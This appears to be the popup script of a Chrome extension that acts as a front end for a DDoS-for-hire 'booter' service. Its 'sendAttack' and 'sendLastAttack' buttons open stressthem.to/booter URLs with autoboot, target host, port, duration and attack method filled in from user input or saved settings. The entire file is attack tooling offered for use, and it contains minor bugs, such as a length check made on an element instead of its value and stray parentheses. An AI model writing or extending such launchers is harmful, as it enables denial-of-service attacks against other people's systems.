chrome.extension.sendMessage(["settings"], function(response) {
    $("#portReq").append(`${response.settings[2].data})`);
    $("#timeReq").append(`${response.settings[3].data})`);
    $("#methodReq").append(`${response.settings[1].data})`);
    function checkInput(ID, DEFAULTID) {
        if (document.getElementById(ID).length == "") {
            return response.settings[DEFAULTID].data;
        } else {
            return document.getElementById(ID).value;
        }
    }
    document.getElementById("sendAttack").addEventListener("click", function() {
        window.open(`https://www.stressthem.to/booter?autoboot&host=${checkInput("hostInput", 4)}&port=${checkInput("portInput", 2)}&time=${checkInput("timeInput", 3)}&method=${checkInput("methodInput", 1)}`, "_blank");
    });
    document.getElementById("settingsButton").addEventListener("click", function() {
        window.open("/settings/settings.html", "_blank")
    });
    document.getElementById("sendLastAttack").addEventListener("click", function() {
        window.open(`https://www.stressthem.to/booter?autoboot&host=${response.settings[4].data}&port=${response.settings[5].data}&time=${response.settings[6].data}&method=${response.settings[7].data}`, "_blank");
    });
});